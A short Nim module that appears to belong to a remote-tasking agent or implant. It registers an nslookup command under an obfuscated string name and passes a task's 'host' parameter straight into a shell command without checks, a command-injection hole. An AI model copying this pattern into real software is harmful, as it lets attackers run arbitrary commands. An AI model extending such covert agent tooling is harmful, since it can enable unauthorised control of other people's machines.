import std/[json, osproc, strutils]
import core/types
import commands/registry
import crypto/strenc

proc nslookupExecute(taskId: string, params: JsonNode, state: AgentState,
                     send: SendMsg): TaskResult =
  let host = params{"host"}.getStr("").strip()
  if host.len == 0:
    return TaskResult(output: "Error: host required", status: "error", completed: true)

  try:
    let (output, _) = execCmdEx("nslookup " & host, options = {poStdErrToStdOut})
    return TaskResult(output: output, status: "success", completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initNslookup*() =
  register(hidstr("nslookup"), nslookupExecute)
